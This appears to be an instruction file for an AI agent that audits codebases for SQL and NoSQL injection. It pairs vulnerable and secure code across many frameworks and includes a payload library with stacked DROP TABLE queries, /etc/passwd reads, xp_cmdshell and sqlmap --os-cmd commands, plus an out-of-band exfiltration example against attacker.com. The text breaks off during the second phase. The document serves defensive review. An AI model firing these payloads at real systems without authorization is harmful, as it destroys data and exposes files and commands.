# SQL Injection (SQLi) Detection

[ref: #sqli-detection]

You are performing a focused security assessment to find SQL injection vulnerabilities in a codebase. This skill uses a three-phase approach with subagents: **recon** (find vulnerable SQL construction sites), **batched verify** (taint analysis in parallel batches of 3), and **merge** (consolidate batch reports into one file).

**Prerequisites**: `{{ REPORTS_ROOT }}/01_architecture.md` must exist. Run the analysis skill first if it doesn't.

## Table of contents

- [What is SQL Injection](#what-is-sql-injection)
- [Vulnerable vs. Secure Examples](#vulnerable-vs-secure-examples)
- [SQLi Variant Taxonomy](#sqli-variant-taxonomy)
- [ORM Unsafe-Pattern Cheat Sheet](#orm-unsafe-pattern-cheat-sheet)
- [Dynamic-Test Payload Library](#dynamic-test-payload-library)
- [Execution](#execution)
- [OWASP API Security Top 10 2023 mapping](#owasp-api-security-top-10-2023-mapping)
- [CWE references](#cwe-references)
- [Important Reminders](#important-reminders)
- [References](#references)

---

## What is SQL Injection

SQL injection occurs when user-supplied input is incorporated into SQL queries through string concatenation or interpolation rather than parameterized binding. This allows attackers to alter query logic, bypass authentication, extract sensitive data, modify or delete records, and in some configurations execute OS commands.

The core pattern: *unvalidated, unparameterized user input reaches a SQL query execution call.*

In API contexts the risk is amplified: endpoints often accept JSON, query parameters, path variables, or GraphQL arguments that are mapped directly to database queries; a single vulnerable resolver or repository method can expose the entire data store.

### What SQLi IS

- Concatenating user input directly into a SQL string: `"SELECT * FROM users WHERE name = '" + username + "'"`
- Using string formatting to build queries: `f"SELECT * FROM orders WHERE id = {order_id}"`
- Dynamic `ORDER BY` / `GROUP BY` / table/column names from user input with no allowlist validation
- ORM raw query methods with unsanitized input: `User.objects.raw(f"SELECT * WHERE id={id}")`, `$queryRawUnsafe(input)`, `FromSqlRaw("..." + var)`
- Second-order injection: input is stored in the DB and later used in a raw query without re-parameterization
- Stored-procedure SQLi: dynamic SQL built inside a stored procedure via `EXECUTE IMMEDIATE`, `sp_executesql`, `PREPARE/EXECUTE`, `OPEN ... FOR sql_string`, or string concatenation
- Batch / stacked-query injection: code passes raw strings to `execute()` without prepared-statement mode, allowing `;` multi-statement payloads
- Time-based blind SQLi: injectable parameter is used in a query where a time-delay payload (`SLEEP(5)`, `pg_sleep(5)`) causes a measurable delay
- Boolean-based blind SQLi: true/false payloads produce measurably different response content or status codes
- GraphQL resolver SQLi: resolver arguments are interpolated into raw SQL or unsafe ORM calls
- NoSQL injection: attackers inject query operators (`$ne`, `$where`, `$regex`) into MongoDB, DynamoDB expressions, Elasticsearch/Lucene DSL, or other non-relational query languages
- Out-of-band SQLi: payloads that cause the database to issue DNS or HTTP requests (e.g., `LOAD_FILE(CONCAT('\\\\',SUBSTRING(...),'.attacker.com\\a.txt'))`)

### What SQLi is NOT

Do not flag these as SQLi:

- **IDOR**: Changing `?id=1` to `?id=2` to access another user's data — that's Insecure Direct Object Reference, a separate class
- **Mass assignment**: Setting extra ORM model fields from user input — different vulnerability
- **XSS via database**: Storing a `<script>` tag in the DB that's later rendered unescaped — that's XSS, not SQLi
- **Command injection**: User input passed to `os.system`, `exec`, `Runtime.getRuntime().exec`, etc. — separate class
- **LDAP injection**: Input concatenated into LDAP filter strings — separate class
- **Safe ORM queries**: Parameterized ORM lookups like `User.objects.filter(id=user_id)` or `User.find(params[:id])` — do not flag these

### Patterns That Prevent SQLi

When you see these patterns, the code is likely **not vulnerable**:

**1. Parameterized queries / prepared statements (most common fix)**
```python
# Python — cursor.execute with tuple binding
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Node.js — mysql2 / pg placeholder binding
db.query("SELECT * FROM users WHERE id = ?", [userId])
pool.query("SELECT * FROM users WHERE id = $1", [userId])

# Java — PreparedStatement
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, userId);

# Go — database/sql placeholder
db.QueryRow("SELECT * FROM users WHERE id = $1", userID)

# PHP — PDO with named params
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $userId]);

# C# — SqlCommand with parameters
cmd.CommandText = "SELECT * FROM users WHERE id = @id";
cmd.Parameters.AddWithValue("@id", userId);
```

**2. ORM query builder (safe by default)**
```python
# Django ORM
User.objects.filter(id=user_id)

# ActiveRecord (Rails)
User.find(params[:id])
User.where(name: params[:name])

# Prisma (tagged template literal form of $queryRaw)
await prisma.$queryRaw`SELECT * FROM users WHERE id = ${userId}`

# Sequelize with replacements
await sequelize.query("SELECT * FROM users WHERE id = ?", { replacements: [userId] })

# Laravel Eloquent (non-raw)
User::find($id)

# Hibernate / JPA
entityManager.createQuery("SELECT u FROM User u WHERE u.id = :id")
    .setParameter("id", userId)
```

**3. Allowlist validation for dynamic identifiers**
```python
# Dynamic ORDER BY — validate column name against a hardcoded set before interpolating
ALLOWED_COLUMNS = {'name', 'created_at', 'price'}
if sort_col not in ALLOWED_COLUMNS:
    raise ValueError("Invalid column")
query = f"SELECT * FROM products ORDER BY {sort_col}"  # safe only after allowlist check
```

---

## Vulnerable vs. Secure Examples

### Python — Django (raw SQL)

```python
# VULNERABLE: f-string interpolation in raw()
def search_users(request):
    username = request.GET.get('username')
    users = User.objects.raw(f"SELECT * FROM auth_user WHERE username = '{username}'")
    return JsonResponse(list(users.values()), safe=False)

# SECURE: parameterized raw()
def search_users(request):
    username = request.GET.get('username')
    users = User.objects.raw("SELECT * FROM auth_user WHERE username = %s", [username])
    return JsonResponse(list(users.values()), safe=False)
```

### Python — Flask / SQLAlchemy

```python
# VULNERABLE: f-string into text()
@app.route('/search')
def search():
    name = request.args.get('name')
    result = db.session.execute(text(f"SELECT * FROM products WHERE name = '{name}'"))
    return jsonify(result.fetchall())

# SECURE: named bound parameter
@app.route('/search')
def search():
    name = request.args.get('name')
    result = db.session.execute(
        text("SELECT * FROM products WHERE name = :name"), {"name": name}
    )
    return jsonify(result.fetchall())
```

### Python — sqlite3 / psycopg2

```python
# VULNERABLE
def get_user(username):
    cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")
    return cursor.fetchone()

# SECURE
def get_user(username):
    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
    return cursor.fetchone()
```

### Node.js — mysql2

```javascript
// VULNERABLE: template literal in query string
app.get('/user', async (req, res) => {
  const { id } = req.query;
  const [rows] = await db.query(`SELECT * FROM users WHERE id = ${id}`);
  res.json(rows);
});

// SECURE: placeholder binding
app.get('/user', async (req, res) => {
  const { id } = req.query;
  const [rows] = await db.query('SELECT * FROM users WHERE id = ?', [id]);
  res.json(rows);
});
```

### Node.js — pg (PostgreSQL)

```javascript
// VULNERABLE
app.get('/orders', async (req, res) => {
  const status = req.query.status;
  const result = await pool.query(`SELECT * FROM orders WHERE status = '${status}'`);
  res.json(result.rows);
});

// SECURE
app.get('/orders', async (req, res) => {
  const status = req.query.status;
  const result = await pool.query('SELECT * FROM orders WHERE status = $1', [status]);
  res.json(result.rows);
});
```

### Ruby on Rails

```ruby
# VULNERABLE: string interpolation in where()
def search
  @users = User.where("name = '#{params[:name]}'")
end

# VULNERABLE: find_by_sql with interpolation
def find_user
  @user = User.find_by_sql("SELECT * FROM users WHERE email = '#{params[:email]}'")
end

# SECURE: parameterized where()
def search
  @users = User.where("name = ?", params[:name])
  # or using hash form: User.where(name: params[:name])
end
```

### Java — Spring JDBC

```java
// VULNERABLE: string concatenation
public User findUser(String username) {
    String sql = "SELECT * FROM users WHERE username = '" + username + "'";
    return jdbcTemplate.queryForObject(sql, userRowMapper);
}

// SECURE: parameterized query
public User findUser(String username) {
    return jdbcTemplate.queryForObject(
        "SELECT * FROM users WHERE username = ?", userRowMapper, username
    );
}
```

### Java — Hibernate / JPA native query

```java
// VULNERABLE: concatenation into native query
public User findUserById(String id) {
    String sql = "SELECT * FROM users WHERE id = " + id;
    return (User) entityManager.createNativeQuery(sql, User.class).getSingleResult();
}

// SECURE: positional parameter
public User findUserById(String id) {
    return (User) entityManager.createNativeQuery(
        "SELECT * FROM users WHERE id = ?1", User.class)
        .setParameter(1, id)
        .getSingleResult();
}
```

### Go — database/sql

```go
// VULNERABLE: fmt.Sprintf to build query
func GetUserByName(name string) (*User, error) {
    query := fmt.Sprintf("SELECT * FROM users WHERE name = '%s'", name)
    row := db.QueryRow(query)
    // ...
}

// SECURE: parameterized query
func GetUserByName(name string) (*User, error) {
    row := db.QueryRow("SELECT * FROM users WHERE name = $1", name)
    // ...
}
```

### PHP — PDO

```php
// VULNERABLE: string concatenation
function getUser($id) {
    $stmt = $pdo->query("SELECT * FROM users WHERE id = " . $id);
    return $stmt->fetch();
}

// SECURE: prepared statement
function getUser($id) {
    $stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
    $stmt->execute(['id' => $id]);
    return $stmt->fetch();
}
```

### PHP — Laravel / Eloquent

```php
// VULNERABLE: DB::raw with interpolation
$users = DB::table('users')
    ->whereRaw("name = '{$request->input('name')}'")
    ->get();

// VULNERABLE: orderByRaw with request value
$users = User::orderByRaw($request->input('sort'))->get();

// SECURE: parameterized whereRaw / orderBy with allowlist
$users = User::whereRaw("name = ?", [$request->input('name')])->get();
$sort = in_array($request->input('sort'), ['name','created_at']) ? $request->input('sort') : 'name';
$users = User::orderBy($sort)->get();
```

### C# — ADO.NET

```csharp
// VULNERABLE: string concatenation
public User GetUser(string username) {
    using var cmd = new SqlCommand(
        "SELECT * FROM Users WHERE Username = '" + username + "'", conn);
    return ReadUser(cmd.ExecuteReader());
}

// SECURE: parameterized command
public User GetUser(string username) {
    using var cmd = new SqlCommand(
        "SELECT * FROM Users WHERE Username = @username", conn);
    cmd.Parameters.AddWithValue("@username", username);
    return ReadUser(cmd.ExecuteReader());
}
```

### C# — Entity Framework

```csharp
// VULNERABLE: FromSqlRaw with interpolation
var users = context.Users.FromSqlRaw($"SELECT * FROM Users WHERE Name = '{name}'").ToList();

// SECURE: FromSqlRaw with parameter + SqlParameter
var users = context.Users.FromSqlRaw("SELECT * FROM Users WHERE Name = {0}", name).ToList();

// VULNERABLE: ExecuteSqlRaw with concatenation
context.Database.ExecuteSqlRaw("UPDATE Users SET Role = '" + role + "' WHERE Id = " + id);

// SECURE: ExecuteSqlRaw with parameter
context.Database.ExecuteSqlRaw("UPDATE Users SET Role = @role WHERE Id = @id",
    new SqlParameter("@role", role), new SqlParameter("@id", id));
```

### Dynamic ORDER BY / Column Names (all stacks)

```python
# VULNERABLE: unsanitized user input as column name (parameterization can't help here)
sort_col = request.args.get('sort', 'name')
cursor.execute(f"SELECT * FROM products ORDER BY {sort_col}")

# SECURE: allowlist validation before interpolation
ALLOWED_SORT_COLS = {'name', 'price', 'created_at'}
sort_col = request.args.get('sort', 'name')
if sort_col not in ALLOWED_SORT_COLS:
    return abort(400)
cursor.execute(f"SELECT * FROM products ORDER BY {sort_col}")
```

### GraphQL resolver SQLi (Node.js / pg)

```javascript
// VULNERABLE: resolver argument interpolated into raw SQL
const resolvers = {
  Query: {
    user: async (_, args) => {
      const result = await pool.query(`SELECT * FROM users WHERE id = ${args.id}`);
      return result.rows[0];
    }
  }
};

// SECURE: parameterized query in resolver
const resolvers = {
  Query: {
    user: async (_, args) => {
      const result = await pool.query('SELECT * FROM users WHERE id = $1', [args.id]);
      return result.rows[0];
    }
  }
};
```

### GraphQL resolver SQLi (Python / Graphene + SQLAlchemy)

```python
# VULNERABLE
class Query(graphene.ObjectType):
    user = graphene.Field(UserType, id=graphene.String())

    def resolve_user(self, info, id):
        result = db.session.execute(text(f"SELECT * FROM users WHERE id = '{id}'"))
        return result.fetchone()

# SECURE
class Query(graphene.ObjectType):
    user = graphene.Field(UserType, id=graphene.Int())

    def resolve_user(self, info, id):
        result = db.session.execute(text("SELECT * FROM users WHERE id = :id"), {"id": id})
        return result.fetchone()
```

### GraphQL resolver SQLi (Java / graphql-java + JDBC)

```java
// VULNERABLE
DataFetcher<User> userFetcher = env -> {
    String id = env.getArgument("id");
    String sql = "SELECT * FROM users WHERE id = '" + id + "'";
    return jdbcTemplate.queryForObject(sql, userRowMapper);
};

// SECURE
DataFetcher<User> userFetcher = env -> {
    Long id = env.getArgument("id");   // GraphQL scalar coercion
    return jdbcTemplate.queryForObject(
        "SELECT * FROM users WHERE id = ?", userRowMapper, id);
};
```

### Stored procedure SQLi (PL/SQL example)

```sql
-- VULNERABLE: dynamic SQL built inside the procedure
CREATE PROCEDURE get_user(p_id IN VARCHAR2) AS
BEGIN
  EXECUTE IMMEDIATE 'SELECT * FROM users WHERE id = ' || p_id;
END;

-- SECURE: bind variable inside dynamic SQL
CREATE PROCEDURE get_user(p_id IN VARCHAR2) AS
BEGIN
  EXECUTE IMMEDIATE 'SELECT * FROM users WHERE id = :id' USING p_id;
END;
```

### Stored procedure SQLi (T-SQL example)

```sql
-- VULNERABLE
CREATE PROCEDURE sp_GetUser @name NVARCHAR(50)
AS
BEGIN
  DECLARE @sql NVARCHAR(MAX) = N'SELECT * FROM users WHERE name = ''' + @name + '''';
  EXEC sp_executesql @sql;
END

-- SECURE
CREATE PROCEDURE sp_GetUser @name NVARCHAR(50)
AS
BEGIN
  EXEC sp_executesql N'SELECT * FROM users WHERE name = @name', N'@name NVARCHAR(50)', @name;
END
```

### Stored procedure SQLi (MySQL example)

```sql
-- VULNERABLE
CREATE PROCEDURE GetUser(IN p_email VARCHAR(255))
BEGIN
  SET @sql = CONCAT('SELECT * FROM users WHERE email = ''', p_email, '''');
  PREPARE stmt FROM @sql;
  EXECUTE stmt;
  DEALLOCATE PREPARE stmt;
END

-- SECURE
CREATE PROCEDURE GetUser(IN p_email VARCHAR(255))
BEGIN
  SET @email = p_email;
  PREPARE stmt FROM 'SELECT * FROM users WHERE email = ?';
  EXECUTE stmt USING @email;
  DEALLOCATE PREPARE stmt;
END
```

### Batch / stacked query injection (Node.js / pg)

```javascript
// VULNERABLE: raw string allows stacked statements when multi-statement mode is enabled
app.post('/update', async (req, res) => {
  const { note } = req.body;
  await pool.query(`UPDATE notes SET body = '${note}' WHERE id = 1`);
  res.sendStatus(200);
});

// Attacker payload in note:
//   '; DROP TABLE notes; --

// SECURE: parameterized update prevents statement stacking
app.post('/update', async (req, res) => {
  const { note } = req.body;
  await pool.query('UPDATE notes SET body = $1 WHERE id = $2', [note, 1]);
  res.sendStatus(200);
});
```

### Second-order SQLi (Python / Django)

```python
# VULNERABLE: user-supplied display_name is stored safely, then used unsafely later
def save_profile(request):
    profile = UserProfile.objects.get(user=request.user)
    profile.display_name = request.POST.get('display_name')   # stored with parameterization
    profile.save()

def admin_report(request):
    for profile in UserProfile.objects.all():
        # VULNERABLE: stored value concatenated into a raw report query
        cursor.execute(f"SELECT * FROM activity WHERE actor_name = '{profile.display_name}'")
```

### NoSQL injection — MongoDB (Node.js / Mongoose)

```javascript
// VULNERABLE: req.body.username can be an object like { "$ne": null }
app.post('/login', async (req, res) => {
  const user = await User.findOne({ username: req.body.username, password: req.body.password });
  res.json(user);
});

// SECURE: cast to string, validate schema, or use an allowlist
app.post('/login', async (req, res) => {
  const username = String(req.body.username);
  const password = String(req.body.password);
  const user = await User.findOne({ username, password });
  res.json(user);
});
```

### NoSQL injection — DynamoDB (Python / boto3)

```python
# VULNERABLE: user input concatenated into KeyConditionExpression
user_id = event['pathParameters']['id']
response = table.query(
    KeyConditionExpression=f"user_id = {user_id}"
)

# SECURE: use expression attribute values
response = table.query(
    KeyConditionExpression="user_id = :uid",
    ExpressionAttributeValues={":uid": user_id}
)
```

### NoSQL injection — Elasticsearch (Python)

```python
# VULNERABLE: user input concatenated into query DSL
q = '{"query": {"match": {"name": "%s"}}}' % request.args.get('name')
res = es.search(index="products", body=q)

# SECURE: build DSL as a structure, not a string
res = es.search(index="products", body={
    "query": {"match": {"name": request.args.get('name')}}
})
```

---

## SQLi Variant Taxonomy

In addition to classic relational SQLi, subagents should flag these API-relevant variants when the architecture indicates the corresponding technology is in use.

| Variant | Attack example | Detection signal |
| --- | --- | --- |
| Classic relational SQLi | `' OR '1'='1' --` | String concatenation / interpolation into `execute`, `query`, `prepare`. |
| ORM raw/unsafe injection | `User.objects.raw(f"...")`, `$queryRawUnsafe(input)` | Raw/unsafe ORM methods called with a non-static string. |
| MongoDB NoSQLi | `{ "username": { "$ne": null }, "password": { "$ne": null } }` | User input passed directly into `find`, `findOne`, or aggregation pipelines without schema validation. |
| DynamoDB injection | `KeyConditionExpression` built with string concatenation | Raw string expressions containing user input in boto3/DynamoDB SDK calls. |
| DynamoDB filter injection | `FilterExpression` with unsanitized placeholders | Missing `ExpressionAttributeValues` / `ExpressionAttributeNames`. |
| Elasticsearch/Lucene injection | `q=username:* AND password:*` | User input concatenated into query DSL strings. |
| GraphQL resolver SQLi | Resolver args interpolated into raw SQL | `pool.query(`SELECT * FROM users WHERE id = ${args.id}`)`. |
| Second-order SQLi | Stored user value later used in a report/batch query | User-provided values saved to the DB and later read into dynamic SQL by batch jobs, admin tools, or import pipelines. |
| Stored-procedure SQLi | `EXECUTE IMMEDIATE 'SELECT ... ' \|\| user_id` | Dynamic SQL inside stored procedures, functions, or packages. |
| Batch / stacked query | `'; DROP TABLE users; --` | Raw strings passed to `execute()` without prepared-statement mode; drivers that allow multiple statements. |
| Boolean-based blind | `' AND 1=1 --` vs `' AND 1=2 --` | Same error page returns different content/length/status for true and false conditions. |
| Time-based blind | `' OR SLEEP(5)--` | Injectable parameter used in a query where a time-delay payload causes a measurable response delay. |
| Out-of-band (OOB) | DNS/HTTP exfiltration payloads | Database functions such as `LOAD_FILE`, `UTL_HTTP`, `xp_dirtree` reachable from injectable parameter. |

### Detection heuristics per variant

**Classic relational SQLi**
- Look for SQL keywords (`SELECT`, `INSERT`, `UPDATE`, `DELETE`, `WHERE`, `ORDER BY`) in string literals that are built with `+`, `.format`, f-strings, template literals, `sprintf`, `String.format`, or interpolation.
- Confirm the string reaches a query execution method.

**ORM raw/unsafe injection**
- Identify raw methods and verify whether the query string is static. Tagged template literals (`prisma.$queryRaw\`...\``) with inline `${}` are safe because the driver binds them; any other form is suspect.
- `.literal()`, `.where("col = '"+var+"'")`, `.from_sql`, `.raw`, `.unsafe` are high-signal patterns.

**MongoDB NoSQLi**
- `findOne({ username: req.body.username })` where `req.body.username` can be an object.
- `$where`, `$expr`, `$regex`, `$ne`, `$gt`, `$in` operators built from request data.
- Aggregation pipelines with `$match` stages driven by user input.

**DynamoDB**
- `KeyConditionExpression` or `FilterExpression` containing `f"..."` or `+` in Python, template literals in JS.
- Missing `ExpressionAttributeValues` or use of placeholders without values.

**Elasticsearch / Lucene**
- String building for `body=` or `q=` parameters.
- Use of raw JSON strings for DSL instead of language-native structures.

**GraphQL resolver SQLi**
- Any resolver that builds SQL using `args.*` or `ctx.req.*` values.
- Look for `pool.query`, `session.execute`, `jdbcTemplate`, `entityManager` inside resolver functions.

**Second-order SQLi**
- Values read from the database (e.g., `profile.display_name`, `imported_record.reference`) are later interpolated into SQL.
- Batch/report/admin endpoints that query stored user content.

**Stored-procedure SQLi**
- `EXECUTE IMMEDIATE`, `sp_executesql`, `EXEC(...)`, `PREPARE/EXECUTE`, `OPEN cursor FOR ...` inside procedure/function definitions.
- Application code calling a procedure with a dynamic argument is not itself SQLi unless the procedure concatenates internally; both layers must be checked.

**Batch / stacked queries**
- Drivers that enable `multiStatements` (mysql2), `allowMultiQueries` (Connector/J), or default multi-statement support in some DB-API drivers.
- Code that passes a fully concatenated string to `execute()` rather than a prepared statement.

**Blind SQLi**
- Error suppression or generic error handling that hides database errors.
- Endpoints whose response content depends on the truth of a SQL predicate.
- Time-delay detectability: network baseline must be established; compare response times for `SLEEP(0)` vs `SLEEP(5)`.

---

## ORM Unsafe-Pattern Cheat Sheet

| Stack | Unsafe pattern | Safer alternative |
| --- | --- | --- |
| Python/Django | `User.objects.raw(f"SELECT * FROM app_user WHERE id = {uid}")` | `User.objects.raw("SELECT * FROM app_user WHERE id = %s", [uid])` |
| Python/Django | `User.objects.extra(where=[f"name = '{name}'"])` | `User.objects.filter(name=name)` or `extra(where=["name = %s"], params=[name])` |
| Python/SQLAlchemy | `session.execute(text(f"SELECT * FROM users WHERE id = {uid}"))` | `session.execute(text("SELECT * FROM users WHERE id = :id"), {"id": uid})` |
| Java/Hibernate | `createNativeQuery("SELECT * FROM users WHERE id = " + id)` | `createNativeQuery("SELECT * FROM users WHERE id = ?1").setParameter(1, id)` |
| Java/Hibernate | `createQuery("SELECT u FROM User u WHERE u.name = '" + name + "'")` | `createQuery("SELECT u FROM User u WHERE u.name = :name").setParameter("name", name)` |
| Node.js/Sequelize | `sequelize.query(\`SELECT * FROM users WHERE id = ${id}\`)` | `sequelize.query("SELECT * FROM users WHERE id = ?", { replacements: [id] })` |
| Node.js/Sequelize | `where(literal(\`col = '${val}'\`))` | `where({ col: val })` |
| Node.js/TypeORM | `createQueryBuilder().where(\`col = '${val}'\`)` | `createQueryBuilder().where("col = :val", { val })` |
| Node.js/Prisma | `prisma.$queryRawUnsafe(\`...${val}...\`)` | `prisma.$queryRaw\`... ${val} ...\`` |
| Ruby on Rails | `User.find_by_sql("SELECT * FROM users WHERE id = #{params[:id]}")` | `User.find_by_sql(["SELECT * FROM users WHERE id = ?", params[:id]])` |
| Ruby on Rails | `User.where("name = '#{params[:name]}'")` | `User.where("name = ?", params[:name])` or `User.where(name: params[:name])` |
| Go/database/sql | `db.Query("SELECT * FROM users WHERE id = " + id)` | `db.Query("SELECT * FROM users WHERE id = ?", id)` |
| PHP/Laravel | `DB::raw("... {$input} ...")` | `DB::raw("... ? ...", [$input])` or query builder |
| C# / EF Core | `FromSqlRaw($"SELECT ... {name}")` | `FromSqlRaw("SELECT ... {0}", name)` or `FromSqlInterpolated($"... {name}")` |

---

## Dynamic-Test Payload Library

Subagents should include these probes in dynamic-test templates. Always pair manual tests with a sqlmap run when the endpoint is reachable and legal to test.

### MySQL / MariaDB

```sql
-- Error / union-based
' UNION SELECT null,version(),user() -- -

-- Boolean blind
' AND 1=1 -- -   (true branch)
' AND 1=2 -- -   (false branch)

-- Time-based blind
' OR SLEEP(5) -- -
' OR (SELECT SLEEP(5) FROM DUAL) -- -

-- Stacked query
'; DROP TABLE users; -- -
'; INSERT INTO logs VALUES ('pwned'); -- -
```

```bash
sqlmap -u "https://app.example.com/api/search?q=test" -p q --batch --dbs
```

### PostgreSQL

```sql
-- Error / union-based
' UNION SELECT version(), current_user -- -

-- Boolean blind
' AND 1=1 -- -
' AND 1=2 -- -

-- Time-based blind
'; SELECT pg_sleep(5) -- -
' OR pg_sleep(5) -- -

-- Stacked query
'; DROP TABLE users; -- -
'; SELECT pg_read_file('/etc/passwd') -- -
```

```bash
sqlmap -u "https://app.example.com/api/orders?status=test" -p status --dbms=postgresql --batch --tables
```

### Microsoft SQL Server

```sql
-- Error / union-based
' UNION SELECT @@version, db_name() -- -

-- Boolean blind
' AND 1=1 -- -
' AND 1=2 -- -

-- Time-based blind
'; WAITFOR DELAY '0:0:5' -- -
' OR WAITFOR DELAY '0:0:5' -- -

-- Stacked query
'; DROP TABLE users; -- -
'; EXEC xp_cmdshell 'whoami'; -- -
```

```bash
sqlmap -u "https://app.example.com/api/report?id=1" -p id --dbms=mssql --batch --os-cmd=whoami
```

### Oracle

```sql
-- Error / union-based
' UNION SELECT banner, null FROM v$version -- -

-- Boolean blind
' AND 1=1 -- -
' AND 1=2 -- -

-- Time-based blind
'; BEGIN DBMS_LOCK.SLEEP(5); END; -- -
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5) -- -

-- Stacked query (limited; depends on driver)
'; BEGIN EXECUTE IMMEDIATE 'DROP TABLE users'; END; -- -
```

```bash
sqlmap -u "https://app.example.com/api/users?name=test" -p name --dbms=oracle --batch --dbs
```

### SQLite

```sql
-- Error / union-based
' UNION SELECT sqlite_version(), null -- -

-- Boolean blind
' AND 1=1 -- -
' AND 1=2 -- -

-- Time-based blind (CPU-bound; use carefully)
' AND randomblob(1000000000) -- -

-- Stacked query (SQLite does not support stacked statements)
```

### NoSQL injection probes

```json
// MongoDB operator injection
{
  "username": { "$ne": null },
  "password": { "$ne": null }
}

// MongoDB $where injection
{
  "$where": "this.password.length > 0"
}

// DynamoDB injection via KeyConditionExpression
{
  "KeyConditionExpression": "user_id = 1 OR user_id = 1"
}
```

### GraphQL resolver probe

```graphql
query {
  user(id: "1' OR '1'='1") {
    id
    name
  }
}
```

---

## Execution

This skill runs in three phases using subagents. Pass the contents of `{{ REPORTS_ROOT }}/01_architecture.md` to all subagents as context.

### Phase 1: Recon — Find Vulnerable SQL Construction Sites

Launch a subagent with the following instructions:

> **Goal**: Find every location in the codebase where a SQL query is constructed in a vulnerable way — using string concatenation, interpolation, or formatting with any variable (regardless of where that variable comes from). Write results to `{{ REPORTS_ROOT }}/02_recon.md`.
>
> **Context**: You will be given the project's architecture summary. Use it to understand the tech stack, database layer, ORM patterns, and query execution methods.
>
> **What to search for — vulnerable query construction patterns**:
>
> Look for SQL query execution calls where the query string argument is built dynamically rather than being a static string with placeholder parameters. Flag ANY dynamic variable embedded into the query — you are not yet tracing whether the variable is user-controlled; that is Phase 2's job.
>
> 1. **String concatenation into a SQL execution call**:
>    - `cursor.execute("SELECT ... WHERE id = " + var)`
>    - `$pdo->query("SELECT * FROM users WHERE id = " . $var)`
>    - `jdbcTemplate.query("SELECT * WHERE username = '" + var + "'")`
>
> 2. **F-strings / template literals used as a query argument**:
>    - `cursor.execute(f"SELECT * WHERE name = '{var}'")`
>    - `` db.query(`SELECT * WHERE id = ${var}`) ``
>    - `db.QueryRow(fmt.Sprintf("SELECT * WHERE id = '%s'", var))`
>
> 3. **String formatting functions used to build the query**:
>    - `cursor.execute("SELECT * WHERE id = %s" % var)` (note: `%` formatting, NOT parameterized binding)
>    - `cursor.execute("SELECT * WHERE id = {}".format(var))`
>    - `String.format("SELECT * WHERE id = '%s'", var)` (Java)
>    - `sprintf("SELECT * WHERE id = %s", $var)` (PHP)
>
> 4. **ORM raw/unsafe methods called with a dynamically built string** (not a static template with bound params):
>    - Django: `Model.objects.raw(f"...")`, `RawSQL(f"...")`, `extra(where=[f"..."])`
>    - ActiveRecord: `where("col = '#{var}'")`  (Ruby interpolation inside string arg)
>    - Sequelize: `` sequelize.query(`...${var}...`) ``, `literal(var)`
>    - TypeORM: `` createQueryBuilder().where(`col = '${var}'`) ``, `.query("..." + var)`
>    - Prisma: `$queryRawUnsafe(...)`, `$executeRawUnsafe(...)`
>    - Entity Framework: `FromSqlRaw("..." + var)`, `ExecuteSqlRaw("..." + var)`
>    - Hibernate: `createNativeQuery("..." + var)`, `createQuery("..." + var)`
>    - Laravel: `DB::raw("..." . $var)`, `whereRaw("..." . $var)`, `orderByRaw($var)`
>
> 5. **Dynamic identifiers** — any variable used as a column name, table name, `ORDER BY` / `GROUP BY` value in a query string (parameterization cannot protect identifiers; only allowlist validation can):
>    - `f"SELECT * FROM {table_var}"`
>    - `` `SELECT * FROM ${tableVar}` ``
>    - `f"SELECT * ORDER BY {sort_col}"`
>
> 6. **NoSQL query construction from raw user data or string expressions**:
>    - MongoDB: `findOne({ username: req.body.username })` where the body can be an object
>    - DynamoDB: `KeyConditionExpression` / `FilterExpression` built with string interpolation
>    - Elasticsearch: query DSL built by string formatting
>
> 7. **Stored-procedure dynamic SQL**:
>    - `EXECUTE IMMEDIATE '...' || var`
>    - `sp_executesql @sql` where `@sql` is concatenated
>    - MySQL `PREPARE stmt FROM CONCAT('...', var, '...')`
>
> 8. **Batch / stacked query enablers**:
>    - Raw strings passed to `execute()` with drivers that allow `multiStatements` / `allowMultiQueries`
>
> **What to skip** (these are safe construction patterns — do not flag):
> - Static query strings with no dynamic parts: `cursor.execute("SELECT * FROM users WHERE id = %s", (val,))`
> - ORM safe query builder methods: `.filter()`, `.where(col: val)`, `.findOne()`, `.findUnique()`, `prisma.$queryRaw` with tagged template literals
> - Properly parameterized raw queries where the string itself is static and values are passed as a separate argument list: `execute("SELECT * WHERE id = %s", (val,))`, `query("SELECT * WHERE id = ?", [val])`
> - NoSQL queries built as language-native structures with validated scalar values
>
> **Output format** — write to `{{ REPORTS_ROOT }}/02_recon.md`:
>
> ```markdown
> # SQLi Recon: [Project Name]
>
> ## Summary
> Found [N] locations where SQL queries are constructed in a vulnerable way.
>
> ## Vulnerable Construction Sites
>
> ### 1. [Descriptive name — e.g., "String concat in get_user query"]
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Function / endpoint**: [function name or route]
> - **Query execution method**: [cursor.execute / db.query / raw / etc.]
> - **Construction pattern**: [string concat / f-string / template literal / % format / .format() / fmt.Sprintf / ORM raw]
> - **Interpolated variable(s)**: `var_name` — [brief note on what it appears to represent, e.g., "looks like a sort column" or "unknown origin"]
> - **Code snippet**:
>   ```
>   [the vulnerable query construction + execution call]
>   ```
>
> [Repeat for each site]
> ```

### After Phase 1: Check for Candidates Before Proceeding

After Phase 1 completes, read `{{ REPORTS_ROOT }}/02_recon.md`. If the recon found **zero vulnerable construction sites** (the summary reports "Found 0" or the "Vulnerable Construction Sites" section is empty or absent), **skip Phase 2 entirely**. Instead, write the following content to `{{ REPORTS_ROOT }}/02_sqli.md` and stop:

```markdown
# SQLi Analysis Results

No vulnerabilities found.
```

Only proceed to Phase 2 if Phase 1 found at least one vulnerable construction site.

### Phase 2: Verify — Taint Analysis (Batched)

After Phase 1 completes, read `{{ REPORTS_ROOT }}/02_recon.md` and split the construction sites into **batches of up to 3 sites each**. Launch **one subagent per batch in parallel**. Each subagent traces user input only for its assigned sites and writes results to its own batch file.

**Batching procedure** (you, the orchestrator, do this — not a subagent):

1. Read `{{ REPORTS_ROOT }}/02_recon.md` and count the numbered site sections under "Vulnerable Construction Sites" (### 1., ### 2., etc.).
